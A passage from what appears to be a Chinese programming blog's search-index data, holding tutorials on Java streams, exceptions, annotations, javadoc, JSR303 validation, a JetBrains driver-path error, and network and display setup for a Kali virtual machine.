根据读写数据单位不同，将流分为：字节流与字符流。\n字节流的最小读写单位是一个字节，前面介绍的InputStream和OutputStream都属于这一类。\n字符流的最小读写单位是一个字符，字符流虽然是以字符为单位读写数据，其底层实际上还是要以字节的形式读写，所以字符流天生就具备将字节转换为字符或字符转换成字节的能力，所以所有的字符流都是高级流，方便我们读写字符数据，无需再关心字符与字节的相互转换。字符流的父类java.io.Reader和java.io.Writer，他们是以char为单位读写，转换为Unicode，他们规定了字符流的基本方法。这里介绍两个常用的字符流java.io.InputStreamReader和java.io.OutputStreamWriter的使用。字符是高级流，也需要和低级流联合使用。\n除了InputStreamReader与OutputStreamWriter之外的字符流，大部分都只处理其他字符流。但是低级流都是字节流，这时若希望用一个字符流来处理一个字节流就会产生冲突。所以可以通过创建InputStreamReader与OutputStreamWriter来处理字节流，而InputStreamReader与OutputStreamWriter本身是字符流，所以可以使得其他字符流得以处理该流。这样，InputStreamReader与OutputStreamWriter相当于联系字节流和字符流的纽带，类似转化器的效果，因此这两个流也叫转换流。\n1. OutputStreamWriter写文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.io.*; import java.nio.charset.StandardCharsets; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { FileOutputStream fos = new FileOutputStream(\u0026#34;demo.txt\u0026#34;); try (OutputStreamWriter osw = new OutputStreamWriter(fos , StandardCharsets.UTF_8)) { /* * OutputStreamWriter的常用构造方法： * 1.OutputStreamWriter(OutputStream out) * * 2.OutputStreamWriter(outputStream out, String csn) * 将给定的字节输出流转换为字节流的同时，指定通过当前字符流写出的字符数据以何种字符集转换为字节。 */ osw.write(\u0026#34;OutputStreamWriter\u0026#34;); osw.write(\u0026#34;写文件\u0026#34;); char[] buf = \u0026#34;Hello World!\u0026#34;.toCharArray(); osw.write(buf , 0 , buf.length); System.out.println(\u0026#34;成功\u0026#34;); } } } 2. InputStreamReader读文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.io.*; import java.nio.charset.StandardCharsets; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\u0026#34;demo.txt\u0026#34;); /* * 也可以使用一个参数的构造，不加字符集 */ InputStreamReader isr = new InputStreamReader(fis, StandardCharsets.UTF_8); int len = -1; /* * int read(); * 一次读取一个字符，返回一个该字符编码的int值，若返回值为-1则表示读到末尾 */ while((len = isr.read()) != -1){ // 强转，取低16位 char d = (char) len; System.out.print(d); } } } 七、java.io.BufferedReader和java.io.BufferedWriter BufferedWriter 和BufferedRead是缓冲字节流，属于高级流，按行读取字符串。由于这两个字符流不能直接处理字节流，所以需要InputStreamReader和OutputStreamWriter这两个转换流做纽带，将低级字节流和BufferedReader、BufferedWriter关联起来。\n虽然这两个流读写的速度快，但是没有太多的方法可以使用，所有使用的较少。下面只测试一下java.io.BUfferedReader。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import java.io.*; import java.nio.charset.StandardCharsets; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\u0026#34;demo.txt\u0026#34;); //转换流InputStreamReader可以指定字符集 BufferedReader br = new BufferedReader(new InputStreamReader(fis, StandardCharsets.UTF_8)); /* * String readLine() * 连续读取若干字符，直到遇到换行符为止，将换行符之前的所有字符以一个字符串返回（不包括换行符） * 若该方法返回值为null，则表示读取到了末尾（如果一行为空，返回空串“”） * 注意，返回的字符串不包含最后的换行符 */ String line = null; while((line = br.readLine()) != null){ //line中不包含\\n System.out.println(line); } br.close(); } } 八、java.io.PrintWriter ​\t缓冲字节流 java.io.PrintWriter，是一种比较常用的输出流。其内部维护了一个缓冲区（字节数组），按行写字符串，写字符效率高。内部自动处理BufferedWriter来完成缓冲操作， 并且PrintWriter具有自动行刷新功能。\n1. PrintWriter写文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import java.io.*; import java.nio.charset.StandardCharsets; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { /** * PrintWriter提供了丰富的构造方法 * 其中提供了可以针对文件写出操作的构造方法： * PrintWriter(String path) * PrintWriter(File file) * 是个高级流，不用对接低级流，源码已经使用了低级流，可以不加字符集 */ try (PrintWriter pw = new PrintWriter(\u0026#34;demo.txt\u0026#34; , \u0026#34;utf-8\u0026#34;)) { pw.println(\u0026#34;`PrintWriter`写文件\u0026#34;); System.out.println(\u0026#34;finished!\u0026#34;); } // 最终的文件大小大于所有的字符之和，因为有换行符 } } 2. PrintWriter处理其他流 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.io.*; import java.nio.charset.StandardCharsets; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { FileOutputStream fos = new FileOutputStream(\u0026#34;demo.txt\u0026#34;); /* * PrintWriter构造传入字节流，不能指定字符集: PrintWriter pw = new PrintWriter(fos); * 若希望指定字符集，需要在中间使用转换流OutputStreamWriter */ OutputStreamWriter osw = new OutputStreamWriter(fos, StandardCharsets.UTF_8); try (PrintWriter pw = new PrintWriter(osw)) { pw.println(\u0026#34;PrintWriter处理其他流\u0026#34;); System.out.println(\u0026#34;成功\u0026#34;); } } } 3. PrintWriter自动行刷新 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.io.*; import java.util.Scanner; public class Demo { public static void main(String[] args) throws IOException, ClassNotFoundException { //true是自动刷新，可以只用一个参数 try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(\u0026#34;demo.txt\u0026#34;)) , true)) { System.out.println(\u0026#34;请输入文件内容:\u0026#34;); Scanner sc = new Scanner(System.in); while (true) { String str = sc.nextLine(); if (\u0026#34;exit\u0026#34;.equals(str)) { System.out.println(\u0026#34;结束\u0026#34;); break; } //具有自动行刷新的pw在使用println方法是会自动flush pw.println(str); } } } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","title":"Java学习之路——文件操作"},{"content":"Java学习之路——异常处理 概述 Java 程序运行是会可能会发生错误，但并不是所有的错误都是异常。\n一个健壮的程序必须能够处理各种各样的错误！\nJava 程序中的错误分为两种：\nERROR ERROR 是指 Java 虚拟机无法解决的严重的程序问题。例如：JVM 系统内部错误、资源耗尽型错误等。一般情况下，错误是没法通过针对型的代码进行解决的。\nException Exception 指其它因为编程错误或者其它偶然因素导致的一般性问题，这些问题可以使用针对性的代码进行解决。\n例如：\n空指针访问 数组下标越界 网络错误 \u0026hellip;\u0026hellip; 一、捕获异常 要想处理异常，首先要能够捕捉异常。\n在 Java中，凡是可能抛出异常的语句，都可以用try ... catch捕获。把可能发生异常的语句放在try { ... }中，然后使用catch捕获对应的Exception及其子类。\n一个 try 代码块后面可以跟随多个 catch 代码块进行多种异常的处理。JVM在捕获到异常后，会从上到下匹配catch语句，匹配到某个catch后，执行catch代码块，然后不再继续匹配。\nfinally 关键字用来创建在 try 代码块后面执行的代码块。无论是否发生异常，finally 代码块中的代码总会被执行。在 finally 代码块中，可以运行清理类型等收尾善后性质的语句。\n1 2 3 4 5 6 7 8 9 10 11 try { // 程序代码 } catch (异常类型1 异常的变量名1){ // 程序代码 } catch (异常类型2 异常的变量名2){ // 程序代码 } catch (异常类型3 异常的变量名3){ // 程序代码 } finally { // 程序代码 } 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.util.InputMismatchException; import java.util.Scanner; public class Demo { public static void main(String[] args) { try { int res, divisor; Scanner scan = new Scanner(System.in); divisor = scan.nextInt(); res = 10 / divisor; } catch (ArithmeticException e) { System.out.println(e); System.out.println(\u0026#34;除数不能为0\u0026#34;); } catch (InputMismatchException e1) { System.out.println(e1); System.out.println(\u0026#34;输入出现问题\u0026#34;); } finally { System.out.println(\u0026#34;异常处理完毕\u0026#34;); } } } 二、抛出异常 当某个方法抛出了异常时，如果当前方法没有捕获异常，异常就会被抛到上层调用方法，直到遇到某个try ... catch被捕获为止，这就是异常的传播。\n在 Java 程序中，可以使用 throw 关键字主动抛出异常，对于在方法中主动抛出的情况，一般情况下在函数声明中使用 throws 关键字明确写出可能抛出的异常。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import java.util.InputMismatchException; import java.util.Scanner; public class Demo { public static int test(int dividend, int divisor) throws ArithmeticException { if (divisor == 0) { throw new ArithmeticException(); } else { return dividend / divisor; } } public static void main(String[] args) { try { int res; Scanner scan = new Scanner(System.in); res = Demo.test(scan.nextInt(), scan.nextInt()); System.out.println(res); } catch (ArithmeticException e) { System.out.println(e); System.out.println(\u0026#34;除数不能为0\u0026#34;); } catch (InputMismatchException e1) { System.out.println(e1); System.out.println(\u0026#34;输入出现问题\u0026#34;); } finally { System.out.println(\u0026#34;异常处理完毕\u0026#34;); } } } 三、自定义异常 Java标准库定义大量常见异常，但是有些时候 Java 标准库的异常不够我们使用，这个时候我们就可以选择自己定义异常来处理我们的实际业务需求。\n自定义异常类是需要注意如下几点：\n所有异常都必须是 Throwable 的子类； 如果希望写一个检查性异常类，则需要继承 Exception 类； 如果你想写一个运行时异常类，那么需要继承 RuntimeException 类。 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import java.util.InputMismatchException; import java.util.Scanner; public class Demo { public static int test(int dividend, int divisor) throws ArithmeticException { if (divisor == 0) { throw new DivisorIsZero(); } else { return dividend / divisor; } } public static void main(String[] args) { try { int res; Scanner scan = new Scanner(System.in); res = Demo.test(scan.nextInt(), scan.nextInt()); System.out.println(res); } catch (ArithmeticException e) { System.out.println(e); System.out.println(\u0026#34;除数不能为0\u0026#34;); } catch (InputMismatchException e1) { System.out.println(e1); System.out.println(\u0026#34;输入出现问题\u0026#34;); } finally { System.out.println(\u0026#34;异常处理完毕\u0026#34;); } } } class DivisorIsZero extends ArithmeticException { public DivisorIsZero() { System.out.println(\u0026#34;除数为0\u0026#34;); } } 四、断言 断言（Assertion）是一种调试程序的方式。在Java中，使用assert关键字来实现断言。\n断言失败时会抛出AssertionError，导致程序结束退出。因此，断言不能用于可恢复的程序错误，只应该用于开发和测试阶段。\n注：在 IDEA 中是默认不开启断言的！需要我们手动开启断言！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import java.util.Scanner; public class Demo { public static void main(String[] args) { try { int res, dividend, divisor; Scanner scan = new Scanner(System.in); dividend = scan.nextInt(); divisor = scan.nextInt(); assert divisor != 0 : \u0026#34;divisor must != 0\u0026#34;; System.out.println(\u0026#34;divisor\u0026#34;); res = dividend / divisor; System.out.println(res); } catch (AssertionError e) { System.out.println(\u0026#34;除数不能为0\u0026#34;); } finally { System.out.println(\u0026#34;异常处理完毕\u0026#34;); } } } 五、常见异常 Java标准库定义的常用异常包括：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Exception │ ├─ RuntimeException │ │ │ ├─ NullPointerException │ │ │ ├─ IndexOutOfBoundsException │ │ │ ├─ SecurityException │ │ │ └─ IllegalArgumentException │ │ │ └─ NumberFormatException │ ├─ IOException │ │ │ ├─ UnsupportedCharsetException │ │ │ ├─ FileNotFoundException │ │ │ └─ SocketException │ ├─ ParseException │ ├─ GeneralSecurityException │ ├─ SQLException │ └─ TimeoutException 异常类 异常原因 ArithmeticException 除数为0引起的异常 ArrayStoreException 数组存储空间不够引起的异常 ClassCastException 当把一个对象归为某个类，但实际上此对象并不是由这个类 创建的，也不是其子类创建的，则会引起异常 IllegalMonitorStateException 监控器状态出错引起的异常 NegativeArraySizeException 数组长度是负数，则产生异常 NullPointerException 程序试图访问一个空的数组中的元素或访问空的对象中的 方法或变量时产生异常 SecurityException 由于访问了不应访问的指针，使安全性出问题而引起异常 IndexOutOfBoundsExcention 数组下标越界或字符串访问越界引起异常 IOException 文件未找到、未打开或者I/O操作不能进行而引起异常 ClassNotFoundException 未找到指定名字的类或接口引起异常 CloneNotSupportedException 程序中的一个对象引用Object类的clone方法，但 此对象并没有连接Cloneable接口，从而引起异常 InterruptedException 当一个线程处于等待状态时，另一个线程中断此线程，从而引起异常 NoSuchMethodException 所调用的方法未找到，引起异常 IllegalAccessExcePtion 试图访问一个非public方法 StringIndexOutOfBoundsException 访问字符串序号越界，引起异常 ArrayIdexOutOfBoundsException 访问数组元素下标越界，引起异常 NumberFormatException 字符的 utf-8 代码数据格式有错引起异常 IllegalThreadException 线程调用某个方法而所处状态不适当，引起异常 FileNotFoundException 未找到指定文件引起异常 EOFException 未完成输入操作即遇文件结束引起异常 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/","title":"Java学习之路——异常处理"},{"content":"Java学习之路——注解 概述 什么是注解（Annotation）？注解是放在Java源码的类、方法、字段、参数前的一种特殊“注释”。\n注释会被编译器直接忽略，注解则可以被编译器打包进入class文件，因此，注解是一种用作标注的“元数据”。\n像我们在重写父类方法时总会加上的 @Override，从形式上来说也是一种注解，只是实质上这个注解没干啥事罢了。\n在 Java 程序中注解分为三类：\n由编译器使用的注解； 由工具处理.class文件使用的注解； 在程序运行期能够读取的注解。 我们在定义一个注解时，还可以定义配置参数。配置参数可以包括：基本类型、String、Class以及枚举的数组。\n注解的整个使用流程主要包括三个部分：\ngraph LR A[定义注解] --\u0026gt; B[使用注解] B --\u0026gt; C[读取注解] 一、元注解 在 Java 中有一些注解可以修饰其他注解，这些注解就称为元注解（meta annotation）。\nJava标准库已经定义了一些元注解，我们只需要使用元注解，通常不需要自己去编写元注解。\n@Target 最常用的元注解是@Target。使用@Target可以定义Annotation能够被应用于源码的哪些位置：\n类或接口：ElementType.TYPE； 字段：ElementType.FIELD； 方法：ElementType.METHOD； 构造方法：ElementType.CONSTRUCTOR； 方法参数：ElementType.PARAMETER。 如果不传递参数，则所有地方都可以使用。 @Retention 元注解@Retention定义了Annotation的生命周期：\n仅编译期：RetentionPolicy.SOURCE； 仅 .class 文件：RetentionPolicy.CLASS； 运行期：RetentionPolicy.RUNTIME。 如果@Retention不存在，则该Annotation默认为CLASS。\n一般情况下我们的注解都是需要利用反射进行处理的，因此我们通常情况下都要加上RetentionPolicy.RUNTIME。\n@Repeatable @Repeatable元注解可以定义Annotation是否可重复。\n@Inherited @Inherited元注解定义子类是否可继承父类定义的Annotation。\n@Inherited仅针对@Target(ElementType.TYPE)类型的annotation有效，并且仅针对class的继承，对interface的继承是无效的。\n二、定义注解 完整自定义一个注解分为三步：\n1. 用@interface定义注解 1 2 3 @interface MyAnnotation { } 2. 添加参数和默认值 1 2 3 4 @interface MyAnnotation { int min() default 0; int max() default 255; } 默认值不是必须的，但是添加默认值是一个好习惯，能够为我们减少很多不必要的麻烦。\n3. 使用元注解配置注解 1 2 3 4 5 @Retention(RetentionPolicy.RUNTIME) @interface MyAnnotation { int min() default 0; int max() default 255; } 注解属性 八种基本数据类型； String； 枚举类； Class； 注解类型； 以上类型的一维数组。 value属性：如果注解的属性只有一个，并且叫 value，那么使用该注解时就可以不指定属性名，因为默认是给 value 进行赋值；如果注解的属性有多个，则必须写明属性的对应关系。\n数组：如果注解属性中数组只有一个，那么可以省略 {}。\n三、处理注解 在 Java 程序中，我们一般情况下都是利用反射的方式处理注解。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import java.lang.annotation.*; import java.lang.reflect.Field; import java.lang.reflect.Method; public class Demo { public static void main(String[] args) throws NoSuchFieldException, NoSuchMethodException { // 获取对类的注解 Class\u0026lt;MyClass\u0026gt; clazz = MyClass.class; MyAnnotation annotationClass = clazz.getAnnotation(MyAnnotation.class); System.out.println(annotationClass); // 获取对类属性的注解 Field count = clazz.getField(\u0026#34;count\u0026#34;); MyAnnotation annotationFiled = count.getAnnotation(MyAnnotation.class); System.out.println(annotationFiled); // 获取对方法的注解 Method test = clazz.getMethod(\u0026#34;test\u0026#34;); MyAnnotation annotationMethod = test.getAnnotation(MyAnnotation.class); System.out.println(annotationMethod); } } @MyAnnotation(min = 1, max = 100) class MyClass { @MyAnnotation(min = 5, max = 150) public int count=100; @MyAnnotation(min = 10, max = 200) public void test() {} } // 自定义注解 @Retention(RetentionPolicy.RUNTIME) @interface MyAnnotation { int min() default 0; int max() default 255; } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%B3%A8%E8%A7%A3/","title":"Java学习之路——注解"},{"content":"Java学习之路——注释 一、基本概念 注释就是对代码的解释和说明，其目的是让人们能够更加轻松地了解代码。注释是编写程序时，写程序的人给一个语句、程序段、函数等的解释或提示，能提高程序代码的可读性。\n说白了，注释就是给人看的，计算机是不需要注释的，它是方便看代码的人理解这段代码的意思。（就如同自己小时候读不到英文单词，在下面写拼音一样🙃）\n在 Java程序中，在 xxx.java 程序中书写的注释，编译到 xxx.class 字节码文件中后是不会再存在注释的。\n二、注释的分类及其使用 在 Java 程序中，注释可以分为三种，分别是：单行注释、多行注释和文档注释。\n单行注释 1 // 这是一行单行注释 多行注释 1 2 3 4 /* * 这是多行注释 * 这是多行注释 */ 文档注释 在 xxx.java 文件中书写的文档注释可以使用 javadoc 工具软件来生成信息，并输出到HTML文件中。\n我们先创建一个 Demo.java 程序，然后在程序中书写一个小demo：\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { /** * @Description: This is my first document comment. * @author: An ascetic writer */ System.out.println(\u0026#34;Hello World!\u0026#34;); } } 打开命令行，进入包含 xxx.java 文件的路径下，输入命令：\n1 javadoc Demo.java 随即在当前文件夹下就生成了一堆文件： 打开 index.html 文件： 通过 javadoc 程序就生成了一份完整的API文档。大大节省了开发人员的时间。\njavadoc 标签 javadoc 工具能识别以下标签：\n标签 描述 示例 @author 标识一个类的作者 @author description @deprecated 指名一个过期的类或成员 @deprecated description {@docRoot} 指明当前文档根目录的路径 Directory Path @exception 标志一个类抛出的异常 @exception exception-name explanation {@inheritDoc} 从直接父类继承的注释 Inherits a comment from the immediate surperclass. {@link} 插入一个到另一个主题的链接 {@link name text} {@linkplain} 插入一个到另一个主题的链接，但是该链接显示纯文本字体 Inserts an in-line link to another topic. @param 说明一个方法的参数 @param parameter-name explanation @return 说明返回值类型 @return explanation @see 指定一个到另一个主题的链接 @see anchor @serial 说明一个序列化属性 @serial description @serialData 说明通过writeObject( ) 和 writeExternal( )方法写的数据 @serialData description @serialField 说明一个ObjectStreamField组件 @serialField name type description @since 标记当引入一个特定的变化时 @since release @throws 和 @exception标签一样. The @throws tag has the same meaning as the @exception tag. {@value} 显示常量的值，该常量必须是static属性。 Displays the value of a constant, which must be a static field. @version 指定类的版本 @version info 在IDEA中生成 JavaDocument 在导航栏中找到 Tools，选择 Generate JavaDoc：\n对几个区域简单介绍一下：\n选择生成整个项目的文档还是单个文件的 文档输出路径 语言地区，如果是 zh_CN 即代表输出中文的文档 传入JavaDoc的参数 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%B3%A8%E9%87%8A/","title":"Java学习之路——注释"},{"content":"JetBrains系列Database报错：Can\u0026rsquo;t find bundle for base name com.mysql.cj.LocalizedErrorMessages, locale zh_CN. 自己使用 Jetbrains 全家桶链接数据库时出现了Can't find bundle for base name com.mysql.cj.LocalizedErrorMessages, locale zh_CN.这个错误。\n错误状态如图所示：\n这个错误的意思是说路径有问题，但是弄了很久都不知道是什么问题。\n最好发现原来是驱动存放的路径问题：Database 模块下载的驱动是存放在 C:\\Users\\用户名\\AppData\\Roaming\\JetBrains\\IntelliJIdea2020.3\\jdbc-drivers\\MySQL ConnectorJ\\8.0.21路径下的，自己之前取的用户名有问题，因此才会报出这个错误。\n至于如何修改用户名大家就自行搜索一下吧，这里面坑太多了，大家要小心鉴别。我自己修改得教程也不放出来了，因为感觉还有点问题。。。。\n这次的问题总结下来就是：用户命名不规范，程序运行两行泪！\n给大家分享一下 Windows 命名的问题：\n不要用中文！ 不要有空格！！ 不要有特殊字符！！！ 命名就用纯粹的英文就行了！！！！ ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/jetbrains%E7%B3%BB%E5%88%97database%E6%8A%A5%E9%94%99cant-find-bundle-for-base-name-com.mysql.cj.localizederrormessages-locale-zh/","title":"JetBrains系列Database报错：Can‘t find bundle for base name com.mysql.cj.LocalizedErrorMessages, locale zh"},{"content":"JSR303 校验 介绍 JSR是Java Specification Requests的缩写，意思是Java 规范提案。是指向JCP(Java Community Process)提出新增一个标准化技术规范的正式请求。任何人都可以提交JSR，以向Java平台增添新的API和服务。JSR已成为Java界的一个重要标准。\n语法 Constraint 详细信息 @Null 被注释的元素必须为 null @NotNull 被注释的元素必须不为 null @AssertTrue 被注释的元素必须为 true @AssertFalse 被注释的元素必须为 false @Min(value) 被注释的元素必须是一个数字，其值必须大于等于指定的最小值 @Max(value) 被注释的元素必须是一个数字，其值必须小于等于指定的最大值 @DecimalMin(value) 被注释的元素必须是一个数字，其值必须大于等于指定的最小值 @DecimalMax(value) 被注释的元素必须是一个数字，其值必须小于等于指定的最大值 @Size(max, min) 被注释的元素的大小必须在指定的范围内 @Digits (integer, fraction) 被注释的元素必须是一个数字，其值必须在可接受的范围内 @Past 被注释的元素必须是一个过去的日期 @Future 被注释的元素必须是一个将来的日期 @Pattern(value) 被注释的元素必须符合指定的正则表达式 表 2. Hibernate Validator 附加的 constraint Constraint 详细信息 @Email 被注释的元素必须是电子邮箱地址 @Length 被注释的字符串的大小必须在指定的范围内 @NotEmpty 被注释的字符串的必须非空 @Range 被注释的元素必须在合适的范围内 示例 格式错误时 首先在 pom.xml 中引入依赖（version：2.3.2）：\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-validation\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; application.yaml\n1 2 3 dog: name: \u0026#34;demo\u0026#34; age: 3 Dog.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package com.example.demo.test; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; import org.springframework.validation.annotation.Validated; import javax.validation.constraints.Email; @Component @ConfigurationProperties(prefix = \u0026#34;dog\u0026#34;) @Validated // 必须引入该注解，否则校验不会生效 public class Dog { @Email() private String name; private Integer age; public Dog() { } public String getName() { return name; } public void setName(String name) { this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } @Override public String toString() { return \u0026#34;Dog{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } DemoApplicationTests.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.example.demo; import com.example.demo.test.Dog; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class DemoApplicationTests { @Autowired private Dog dog; @Test void contextLoads() { System.out.println(dog); } } 启动测试类，结果如下：\n*************************** APPLICATION FAILED TO START *************************** Description: Binding to target org.springframework.boot.context.properties.bind.BindException: Failed to bind properties under \u0026#39;dog\u0026#39; to com.example.demo.test.Dog failed: Property: dog.name Value: demo Origin: class path resource [application.yaml]:2:9 Reason: 不是一个合法的电子邮件地址 Action: Update your application\u0026#39;s configuration 格式正确时 application.yaml\n1 2 3 dog: name: \u0026#34;demo@email.com\u0026#34; age: 3 启动测试类，结果如下：\nDog{name=\u0026#39;demo@email.com\u0026#39;, age=3} 由此可见，参数校验已经生效\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/jsr303%E6%A0%A1%E9%AA%8C/","title":"JSR303校验"},{"content":"Kali 无法连接到网络 问题描述 打开 Kali，无法连接到网络，虚拟机配置正常的。\n尝试 ping 百度，出错：\n1 ping: www.baidu.com: Temporary failure in name resolution 解决办法 1. 首先查看本机 IP 1 2 3 4 5 6 7 8 9 10 ┌──(blogger㉿kali)-[~/Desktop] └─$ ifconfig lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 12 bytes 640 (640.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 12 bytes 640 (640.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 未发现虚拟机网卡，应该是虚拟机网卡出问题了。\n2. 查看所有网卡 1 2 3 4 5 6 7 8 9 10 ┌──(blogger㉿kali)-[~/Desktop] └─$ ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 00:0c:29:d5:a4:ae brd ff:ff:ff:ff:ff:ff 发现网卡，那么应该是网卡没有启动起来，将网卡启动，配置好应该就能解决问题。\n3. 启动网卡并写入配置文件 1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(root💀kali)-[/home/blogger/Desktop] └─# ip link set dev eth0 up # 启动网卡 ┌──(root💀kali)-[/home/blogger/Desktop] └─# ifconfig eth0 192.168.1.201 netmask 255.255.255.0 # 配置IP和网关 ┌──(root💀kali)-[/home/blogger/Desktop] └─# route add default gw 192.168.1.1 # 配置路由 ┌──(root💀kali)-[/home/blogger/Desktop] └─# echo \u0026#39;nameserver 114.114.114.114\u0026#39; \u0026gt;\u0026gt; /etc/resolv.conf # 修改DNS ┌──(root💀kali)-[/home/blogger/Desktop] └─# ping www.baidu.com # 再次尝试 ping，成功 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/kali-%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E5%88%B0%E7%BD%91%E7%BB%9C/","title":"Kali 无法连接到网络"},{"content":"Kali 配置（虚拟机） 一、安装VMWare Tools 为了能够实现主机和虚拟机之间的直接复制粘贴和文件传输，我们需要安装VMWare Tools来帮助我们解决这个问题。\n找到VMWare Tools： 找到VMWare Tools安装文件： 文件拷贝： 将文件放到主目录下， 安装： 依次输入下面命令安装VMWare Tools， 1 2 3 tar zxf VMwareTools-10.0.5-3228253.tar.gz cd vmware-tools-distrib/ sudo ./vmware-install.pl 输入命令后一直敲Enter键即可。 5. 安装完成： 当出现下图语句时即完成VMWare Tools的安装。 二、修改分辨率 当前修改 终端输入下列命令：\n1 2 3 xrandr --newmode \u0026#34;1920x1080\u0026#34; 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync xrandr --addmode Virtual1 1920x1080 xrandr --output Virtual1 --mode 1920x1080 永久修改（推荐） 查看分辨率： 终端输入：1920x1080_60.00对应的是所需修改的分辨率的信息，后续会用到。 1 2 ~$ cvt 1920 1080 Modeline \u0026#34;1920x1080_60.00\u0026#34; 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync 查看显示器名称： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 ~$ xrandr Screen 0: minimum 1 x 1, current 1920 x 1080, maximum 8192 x 8192 Virtual1 connected primary 1920x1080+0+0 (normal left inverted right x axis y axis) 0mm x 0mm 800x600 60.00 + 60.32 2560x1600 59.99 1920x1440 60.00 1856x1392 60.00 1792x1344 60.00 1920x1200 59.88 1600x1200 60.00 1680x1050 59.95 1400x1050 59.98 1280x1024 60.02 1440x900 59.89 1280x960 60.00 1360x768 60.02 1280x800 59.81 1152x864 75.00 1280x768 59.87 1024x768 60.00 640x480 59.94 1920x1080_60.00 59.96* Virtual2 disconnected (normal left inverted right x axis y axis) Virtual3 disconnected (normal left inverted right x axis y axis) Virtual4 disconnected (normal left inverted right x axis y axis) Virtual5 disconnected (normal left inverted right x axis y axis) Virtual6 disconnected (normal left inverted right x axis y axis) Virtual7 disconnected (normal left inverted right x axis y axis) Virtual8 disconnected (normal left inverted right x axis y axis) Virtual1即为显示器名称，后续也会用到。 3. 修改分辨率： 以管理员身份进入profile文件，\n1 ~$ sudo vim /etc/profile 按i进入insert模式修改文件，在文件末尾追加\n1 2 xrandr --newmode \u0026#34;1920x1080_60.00\u0026#34; 173.00 1920 2048 2248 2576 1080 1083 1088 1120 -hsync +vsync xrandr --addmode Virtual1 